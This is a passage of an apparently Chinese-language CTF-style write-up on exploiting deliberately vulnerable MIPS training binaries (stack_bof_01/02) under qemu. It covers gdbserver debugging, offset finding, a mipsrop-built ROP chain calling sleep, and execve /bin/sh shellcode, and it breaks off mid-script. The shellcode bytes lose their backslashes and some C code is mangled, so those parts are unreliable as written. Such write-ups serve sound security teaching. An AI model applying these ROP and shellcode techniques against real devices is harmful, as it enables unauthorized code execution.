    data+=p32(gadget_addr)
    data+=p32(shell_addr)
    f.write(data)
    f.close()
###  qemu模拟调试
1.先启动qemu，配置好网络环境，依次运行start.sh，net.sh（看上面介绍），在qemu里面运行net.sh，并且也要运行一下
    echo 0 > /proc/sys/kernel/randomize_va_space
因为我们用的是debian的，他里面是开了地址随机化的，所以我们要先关闭地址随机化。  
2.将之前在本地运行好的content拷过去
    scp content root@192.168.100.3:/root/
3.我们直接运行的话，没有成功，猜测是因为libc的基地址的问题，所以我们要先调试一下。依次运行下面的指令(经过了很长时间的摸索)：
    #在qemu里面
    chroot . ./gdbserver.mipsel 192.168.100.254:6666 ./pwnable/Intro/stack_bof_01 "`cat content`"
    #一定要在cat content的外面加上“”，我在这吃了大亏，调试了半天，输入总是不对
    #在本机中运行
    gdb-multiarch ./pwnable/Intro/stack_bof_01
    set arch mips #可选
    set endian big/little #可选
    target remote 192.168.100.3:6666
    #进入到gdb中
    b *0x400948
    c
    vmmap
    #出现下面的图
其中可以看到libc的基地址是`0x77ee2000`,我们在content.py脚本中修改一下libc的基地址，在qemu中运行就可以啦。
成功如下图所示：
###  总结
这道题目其实很简单，但是其中的调试方法自己摸索了好几天，简单来说，就是在qemu中运行
    chroot . ./gdbserver.mipsel 调试机ip:6666 程序路径 程序参数
在本机中运行
    gdb-multiarch 程序路径
    set arch mips
    set endian big/little
    target remote 目标机ip:6666
而且在调试过程中遇到了大大小小的问题，真的是学海无涯苦作舟啊。
## stack_bof_02
###  漏洞分析
我们首先看一下源码
    #include 
    #include 
    #include 
    //Simple BoF by b1ack0wl for E1550
    //Shellcode is Required
    int main(int argc, char **argv[]){
    char buf[500] ="";
    if (argc rn-By b1ack0wlrn");
        exit(1);
    } 
    printf("Welcome to the Second BoF exercise! You'll need Shellcode for this! ;)rnrn"); 
    strcpy(buf, argv[1]);
    printf("You entered %s rn", buf);
    printf("Try Againrn");
    return 0;
    }
我们可以看到，这依然是一个简单的栈溢出，参数从程序参数中获取，在用strcpy进行赋值的时候，没有检查长度，导致了栈溢出。因为main函数是非叶子函数，所以当溢出的时候，会覆盖到存放`$ra`的地方，所以当返回的时候，寄存器`$ra`发生变化。这道题目和上面一道题目不同的地方在于，程序里面没有system调用，所以需要调用shellcode。
###  查看文件
我们可以看到，各种保护都没有开，32位小端程序
###  IDA查看
由上面我们可以看到，输入来源是程序的输入，然后经过了strcpy，没有经过检查，所以有栈溢出。
###  本地模拟、调试
1.我们首先还是先编写一个启动脚本local.sh:
     #! /bin/sh
    PORT="1234"
    cp $(which qemu-mipsel-static) ./qemu
    ./qemu -L ./ -g $PORT ./pwnable/Intro/stack_bof_01 "`cat content1`"
    rm ./qemu
2.然后确定一个偏移，我们用`python patternLocOffset -c -l 600 -f
content`生成一个输入脚本content1，然后用local1.sh起起来，用`gdb-multiarch`调试，最终得到寄存器`$ra`的值`0x72413971`,然后用`python patternLocOffset -s
0x72413971 -l 600`得到偏移是508。
3.编写利用脚本，`vi content1.py`为
    from pwn import *
    f=open("content1","wb")
    data = "a"*508
    data+="bbbb"
    f.write(data)
    f.close()
4.然后我们拿这个content1.py生成的content1运行，然后调试，可以看到我们已经成功的劫持了控制流。
5.下面就要进行我们的重点了，也就是rop链的生成。这里有一点需要说的是，我们在调用我们的shellcode之前，要先调用一个`sleep(1)`，（原理的话，引用大佬的话，就是在构造ROP的时候调用sleep()函数，是的D-cach写回，I-cache生效）。
1)所以，这个里面，我们需要先一个gadget，把寄存器`$a0`赋值为`1`的gadget。我们用mipsrop.find(“li `$a0`,1”)
    ----------------------------------------------------------------------------------------------------------------    |  Address     |  Action                                              |  Control Jump                          |
    ----------------------------------------------------------------------------------------------------------------    |  0x00018AA8  |  li $a0,1                                            |  jalr  $s3                             |
    |  0x0002FB10  |  li $a0,1                                            |  jalr  $s1                             |
    |  0x00012D3C  |  li $a0,1                                            |  jr    0x28+var_8($sp)                 |
    |  0x00022420  |  li $a0,1                                            |  jr    0x28+var_8($sp)                 |
    |  0x0002A9C8  |  li $a0,1                                            |  jr    0x20+var_4($sp)                 |
    ----------------------------------------------------------------------------------------------------------------    
我们随便挑选一个，0x2fb10，这个里面的gadget0是
    .text:0002FB10                 li      $a0, 1
    .text:0002FB14                 move    $t9, $s1
    .text:0002FB18                 jalr    $t9 ; sub_2F818
    .text:0002FB1C                 ori     $a1, $s0, 2
2)根据第一个gadget，我们需要一个能给寄存器`$s1`赋值的那么一个gadget1，我们用指令mipsrop.find(“lw
`$s1`,”)，找到了好多，我们随便挑一个，既给寄存器赋值，又用这个寄存器跳转的，
    .text:00006A50                 lw      $ra, 0x68+var_4($sp)
    .text:00006A54                 lw      $s2, 0x68+var_8($sp)
    .text:00006A58                 lw      $s1, 0x68+var_C($sp)
    .text:00006A5C                 lw      $s0, 0x68+var_10($sp)
    .text:00006A60                 jr      $ra
3）所以这个时候，我们的利用脚本如下：
    "a"*508
    p32(gadget1+libc_base)
    "b"*0x58
    "????" #s0
    "????" #s1
    "????" #s2
    p32(gadget0+libc_base)
4)我们这个时候就要想一下，我们在s1的位置填写什么地址，是`sleep`函数的地址嘛？显然不是的，如果这个地方填写了`sleep`函数的地址，那么就直接跳转进`sleep`函数，而`$ra`寄存器还是gadget0的地址，执行完`sleep`函数之后，就又回到了这里，所以这里需要一个既能利用`$s0`或者`$s2`寄存器跳转，并且还能给`$ra`寄存器赋值的gadget2，我们用指令mipsrop.tali()寻找，经过查看，我们采用下面的gadget：
    .text:00020F1C                 move    $t9, $s2
    .text:00020F20                 lw      $ra, 0x28+var_4($sp)
    .text:00020F24                 lw      $s2, 0x28+var_8($sp)
    .text:00020F28                 lw      $s1, 0x28+var_C($sp)
    .text:00020F2C                 lw      $s0, 0x28+var_10($sp)
    .text:00020F30                 jr      $t9
所以，这个时候的利用脚本变成下面的样子：
    "a"*508
    p32(gadget1+libc_base)
    "b"*0x58
    "bbbb" #s0
    p32(gadget2+libc_base) #s1
    p32(sleep_offset+libc_base) #s2
    p32(gadget0+libc_base)
    #---------    "c"*0x18
    "cccc" #s0
    "cccc" #s1
    "cccc" #s2
    "????" #ra
5)我们接下来寻找一个执行完`sleep`函数，跳转的地址，因为这个程序里面栈上可以执行，所以我们在上面部署shellcode，然后跳转过去即可，接下来我们要寻找一个跳转到栈上某个位置的gadget3，没有找到，然后就想先控制一个寄存器的值为栈上的一个值，然后在跳转到这，因此我们用mipsrop.findstacker()寻找，
    .text:00016DD0                 addiu   $a0, $sp, 0x58+var_40
    .text:00016DD4                 move    $t9, $s0
    .text:00016DD8                 jalr    $t9
第一个gadget3如上所示，也就是，因此我们需要先控制寄存器`$s0`，我们看到上面的gadget2，还能控制寄存器`$s0`。
6）接下来我们寻找一个利用`$a0`跳转的gadget4，我们用mipsrop.find(“move `$t9`,`$a0`“)，我们如愿找到一个
    .text:000214A0                 move    $t9, $a0
    .text:000214A4                 sw      $v0, 0x38+var_20($sp)
    .text:000214A8                 jalr    $t9
所以我们的利用脚本变成下面的样子：
    "a"*508
    p32(gadget1+libc_base)
    "b"*0x58
    "bbbb" #s0
    p32(gadget2+libc_base) #s1
    p32(sleep_offset+libc_base) #s2
    p32(gadget0+libc_base)
    #---------    "c"*0x18
    p32(gadget4+libc_base) #s0
    "cccc" #s1
    "cccc" #s2
    p32(gadget3+libc_base) #ra
    #---------    "d"*0x18
    shellcode
7)我们接下来就是填充shellcode，找到一个[网站](http://shell-strom.org/shellcode)，在上面找到一个mips大端的`execve
/bin/sh`的shellcode，将其转换成小端的shellcode如下：
    shellcode = “”
    shellcode += "xffxffx06x28"  # slti $a2, $zero, -1
    shellcode += "x62x69x0fx3c"  # lui $t7, 0x6962
    shellcode += "x2fx2fxefx35"  # ori $t7, $t7, 0x2f2f
    shellcode += "xf4xffxafxaf"  # sw $t7, -0xc($sp)
    shellcode+= "x73x68x0ex3c"  # lui $t6, 0x6873
    shellcode += "x6ex2fxcex35"  # ori $t6, $t6, 0x2f6e
    shellcode += "xf8xffxaexaf"  # sw $t6, -8($sp)
    shellcode += "xfcxffxa0xaf"  # sw $zero, -4($sp)
    shellcode += "xf4xffxa4x27"  # addiu $a0, $sp, -0xc
    shellcode += "xffxffx05x28"  # slti $a1, $zero, -1
    shellcode += "xabx0fx02x24"  # addiu;$v0, $zero, 0xfab
    shellcode += "x0cx01x01x01"  # syscall 0x40404
8)我们将上面的一系列内容编写成contnt.py，如下：
    from pwn import *
    context.endian = "little"
    context.arch = "mips"
    f=open("content1","wb")
    shellcode = ""
    shellcode += "xffxffx06x28"  # slti $a2, $zero, -1
    shellcode += "x62x69x0fx3c"  # lui $t7, 0x6962
    shellcode += "x2fx2fxefx35"  # ori $t7, $t7, 0x2f2f
    shellcode += "xf4xffxafxaf"  # sw $t7, -0xc($sp)